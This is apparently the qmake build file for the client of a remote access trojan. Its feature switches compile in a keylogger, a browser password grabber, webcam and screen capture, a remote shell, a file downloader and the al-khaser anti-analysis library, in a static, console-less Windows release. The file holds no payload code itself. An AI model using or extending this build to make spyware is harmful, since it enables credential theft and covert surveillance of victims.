QT += gui sql
#QT += widgets
QT += multimedia

CONFIG += c++14
CONFIG -= app_bundle

INCLUDEPATH += ../3rdparty

include(../vars.pri)
include(../config.pri)
include(platforms/client-$${PLATFORM_OS}.pri)

defined(RAT_IS_FAKE, var) {
    message(Fake build)
    CONFIG += console
} else {
    message(Standalone release make)
    windows:{
        MSVCRT_LINK_FLAG_RELEASE = "/FS"
        QMAKE_CXXFLAGS_RELEASE = "/FS /MT"

        QMAKE_LFLAGS += /NODEFAULTLIB:LIBCMT
        QMAKE_LFLAGS_WINDOWS = /SUBSYSTEM:WINDOWS,5.01
        QMAKE_LFLAGS_CONSOLE = /SUBSYSTEM:CONSOLE,5.01
#        QMAKE_CXXFLAGS += /FS /MT

        QTPLUGIN.audio = qtaudio_windows
        QTPLUGIN.platforms = qwindows
    }
    linux:{
        QTPLUGIN.audio = qtaudio_alsa
    }
    QTPLUGIN.sql = qsqlite
    CONFIG += static
    CONFIG -= console
}

DEFINES += QT_DEPRECATED_WARNINGS

SOURCES += \
    client.cpp \
    configreader.cpp \
    main.cpp \
    nativeutils.cpp \
    remotecli.cpp \
    test.cpp

HEADERS += \
    client.h \
    configreader.h \
    nativeutils.h \
    remotecli.h

contains(QT, gui) {
    SOURCES += \
        screencaster.cpp
    HEADERS += \
        screencaster.h
}

contains(QT, widgets) {
    SOURCES += \
        desktoplockdialog.cpp
    HEADERS += \
        desktoplockdialog.h
    FORMS += \
        desktoplockdialog.ui
}
contains(QT, multimedia) {
    SOURCES += \
        webcam.cpp \
        webcamimagesurface.cpp
    HEADERS += \
        webcam.h \
        webcamimagesurface.h
}

equals(RAT_KEY_LOGGER, 1) {
    message(Using feature: keylogger)
    SOURCES += \
        keylogger.cpp \
        inputmanager.cpp \
        keys.cpp
    HEADERS += \
        keylogger.h \
        inputmanager.h \
        keys.h \
        win32keys.h \
        x11keys.h
}
equals(RAT_PASSWORD_GRABBER, 1) {
    message(Using feature: browser password grabber)
    include(browserspy/browserspy.pri)
}
equals(RAT_USE_LZ4, 1) {
    message(Using lib: lz4)
    include(../3rdparty/lz4.pri)
}
equals(RAT_USE_SCREEN_LITE, 1) {
    message(Using lib screen: lite)
    include(../3rdparty/screen_capture_lite.pri)
}
equals(RAT_USE_AL_KHASER, 1) {
    message(Using lib screen: al-khaser)
    include(../3rdparty/al-khaser.pri)
}
equals(RAT_FILE_DOWNLOADER, 1) {
    HEADERS += filedownloader.h
    SOURCES += filedownloader.cpp
}

include(../3rdparty/neuron/neuron_client.pri)
include(../3rdparty/SocksLib/SocksLib-client.pri)
include(../common/common.pri)

CONFIG(release, debug|release): DESTDIR += $$PWD/../output/builder/$$PLATFORM_OS/

# Default rules for deployment.
qnx: target.path = /tmp/$${TARGET}/bin
else: unix:!android: target.path = /opt/$${TARGET}/bin
!isEmpty(target.path): INSTALLS += target

